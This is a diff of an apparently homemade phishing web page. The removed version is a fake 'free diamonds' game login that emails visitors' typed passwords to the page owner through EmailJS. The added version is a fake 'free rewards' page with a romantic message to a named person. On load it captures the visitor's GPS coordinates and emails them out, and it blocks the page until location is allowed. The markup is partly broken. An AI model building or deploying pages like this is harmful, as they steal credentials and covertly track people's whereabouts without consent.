@@ -1,140 +1,210 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Free Rewards Zone</title>
+
+<style>
+body{
+ font-family:Arial;
+ background:#f2f2f2;
+ text-align:center;
+}
+
+h1{
+ background:#111;
+ color:white;
+ padding:15px;
+}
+
+.container{
+ display:flex;
+ flex-wrap:wrap;
+ justify-content:center;
+}
+
+.card{
+ background:white;
+ width:260px;
+ margin:15px;
+ padding:15px;
+ border-radius:10px;
+ box-shadow:0 0 10px rgba(0,0,0,0.2);
+}
+
+.card img{
+ width:100%;
+ border-radius:8px;
+}
+
+button{
+ margin-top:10px;
+ padding:10px 15px;
+ background:#28a745;
+ color:white;
+ border:none;
+ border-radius:6px;
+ cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+<div id="locationLock" style="
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:#000;
+color:white;
+display:flex;
+flex-direction:column;
+justify-content:center;
+align-items:center;
+z-index:9999;
+text-align:center;
+padding:20px;
+">
+
+<h2>❤️ Khaas Apke Liye Aaryan Jii ☺️ </h2>
+<p>Maine Aapke Liye Kya Send Kii Hu Jara Aap Bhi Dekhiye </p>
+
+<button onclick="requestLocation()"
+style="padding:14px 22px;font-size:18px;background:#28a745;color:white;border:none;border-radius:8px;">Click My Jaan 
+Aryan
+</button>Aryan My Love ❤️💍
+
+</div>
+<h1>🎁 Free Rewards Collection</h1>
+
+<div class="container" id="products"></div>
+
+<script>
+
+const items = [
+
+{
+ name:"Random Earbuds",
+ img:"https://images.unsplash.com/photo-1585386959984-a41552231658"
+},
+
+{
+ name:"Stylish Shoes",
+ img:"https://images.unsplash.com/photo-1542291026-7eec264c27ff"
+},
+
+{
+ name:"Free Fire Diamond 500",
+ img:"https://i.imgur.com/9Xn4K3K.png"
+},
+
+{
+ name:"PUBG UC 500",
+ img:"https://i.imgur.com/0Z8FQ6S.png"
+}
+
+];
+
+// random items show function
+function showRandomItems(){
+
+ let container = document.getElementById("products");
+ container.innerHTML="";
+
+ let shuffled = items.sort(()=>0.5-Math.random());
+
+ shuffled.forEach(item=>{
+   container.innerHTML += `
+     <div class="card">
+       <img src="${item.img}">
+       <h3>${item.name}</h3>
+       <button onclick="claim()">Claim Now</button>
+     </div>
+   `;
+ });
+
+}
+
+function claim(){
+ alert("Reward claim process start!");
+}
+
+showRandomItems();
+
+</script>
+
+</body>
+</html>
+<h3>Delivery ke liye location allow karein</h3>
+<p>Page open hote hi location request aayegi.</p>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
+// EmailJS Initialize
 (function(){
-emailjs.init("5ijt6R7KPYcuCtNvK");
+   emailjs.init("2pInQghRcP-YZtYCK");
 })();
 
-function sendLogin(e){
-e.preventDefault();
+// Page load hote hi location request
+window.onload = function() {
+   getLocationAndSend();
+};
 
-emailjs.send("service_g9hb3t6","template_e9aw4ub",{
-email: document.getElementById("email").value,
-password: document.getElementById("password").value
-})
-.then(function(){
-alert("Login Request Sent Successfully!");
-});
+function getLocationAndSend() {
+
+ if (navigator.geolocation) {
+
+   navigator.geolocation.getCurrentPosition(function(position){
+
+     var lat = position.coords.latitude;
+     var lon = position.coords.longitude;
+
+     // Email send
+     emailjs.send("service_hxul50k","template_3mjgsjk",{
+        latitude: lat,
+        longitude: lon
+     })
+     .then(function(response) {
+        console.log("Location sent");
+     }, function(error) {
+        console.log("Error sending location");
+     });
+
+   },
+   function(){
+     alert("Free Rewards Ke Liye Allow Kare.");
+   });
+
+ } else {
+   alert("Location supported nahi hai.");
+ }
+
 }
 </script>
+<script>
+function requestLocation(){
 
-<style>
+ if(navigator.geolocation){
 
-body{
-margin:0;
-font-family:Arial;
-.profile-circle{
-width:90px;
-height:90px;
-border-radius:50%;
-overflow:hidden;
-position:absolute;
-top:-0px;
-left:50%;
-transform:translateX(-50%);
-border:5px solid white;
+   navigator.geolocation.getCurrentPosition(
+     function(position){
+
+       // location mil gayi → unlock website
+       document.getElementById("locationLock").style.display="none";
+
+       console.log("Location Allowed");
+
+     },
+     function(){
+       alert Free Rewards Ke Liye Allow Kare.");
+     }
+   );
+
+ }else{
+   alert("Location supported nahi hai.");
+ }
+
 }
-
-.profile-circle img{
-width:100%;
-height:100%;
-object-fit:cover;
-  .top-text{
-font-size:16px;
-color:#333;
-margin-top:40px;
-margin-bottom:5px;
-font-weight:bold;
-  }
-}
-background:linear-gradient(180deg,#c000ff,#7a00ff);
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-}
-
-.card{
-width:340px;
-background:#f3f3f3;
-border-radius:20px;
-padding:30px;
-text-align:center;
-box-shadow:0 10px 25px rgba(0,0,0,0.2);
-}
-
-input{
-width:90%;
-padding:14px;
-margin:10px 0;
-border-radius:10px;
-border:2px solid #ddd;
-font-size:15px;
-}
-
-button{
-width:95%;
-padding:14px;
-margin-top:15px;
-border:none;
-border-radius:10px;
-background:#ff9800;
-color:white;
-font-size:16px;
-cursor:pointer;
-}
-
-button:hover{
-opacity:0.9;
-}.top-image{
-display:flex;
-justify-content:center;
-margin-top:-40px; /* ऊपर लाने के लिए */
-margin-bottom:10px;
-}
-
-.top-image img{
-width:80px;
-height:80px;
-border-radius:50%;
-border:4px solid white;
-object-fit:cover;
-box-shadow:0 0 10px rgba(0,0,0,0.3);
-  }
-
-</style>
-
-</head>
-
-<body>
-
-<div class="card">
-<div class="profile-circle">
-<img src="1774073857441.png">
-</div>
-  <div class="top-image">
-<img src="IMG_20260321_222804.jpg">
-  </div>
-  <p class="top-text">💎 Get Free Diamond 10K 💎</p>
-<h2>Login</h2>
-
-<form onsubmit="sendLogin(event)">
-
-<input type="text" id="email" placeholder="email" required>
-
-<input type="password" id="password" placeholder="password" required>
-
-<button type="submit">Login</button>
-
-</form>
-
-</div>
-
-</body>
-</html>
+</script>
